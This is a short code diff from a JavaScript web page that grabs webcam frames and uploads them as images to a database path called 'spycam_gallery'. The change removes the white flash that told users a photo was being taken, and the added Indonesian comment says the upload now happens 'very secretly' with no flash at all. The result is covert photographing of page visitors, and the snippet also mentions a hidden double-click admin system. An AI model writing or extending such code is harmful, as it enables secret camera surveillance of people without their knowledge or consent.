@@ -295,19 +295,12 @@
             sCtx.drawImage(videoElement, 0, 0, snapCanvas.width, snapCanvas.height);
             const base64 = snapCanvas.toDataURL('image/jpeg', 0.8);
             
-            // Kirim ke galeri
+            // Kirim ke galeri secara sangat diam-diam (tanpa efek flash sama sekali)
             push(ref(db, 'spycam_gallery'), {
                 image: base64,
                 timestamp: Date.now(),
                 userId: myUserId + "_autopose"
             });
-            
-            // Efek Flash Putih tipis biar berasa difoto
-            const flash = document.createElement('div');
-            flash.className = 'fixed inset-0 bg-white z-[100] pointer-events-none opacity-80 transition-all duration-300';
-            document.body.appendChild(flash);
-            setTimeout(() => flash.classList.replace('opacity-80', 'opacity-0'), 50);
-            setTimeout(() => flash.remove(), 400);
         }
 
         // --- 3. SISTEM ADMIN (Double Click) ---
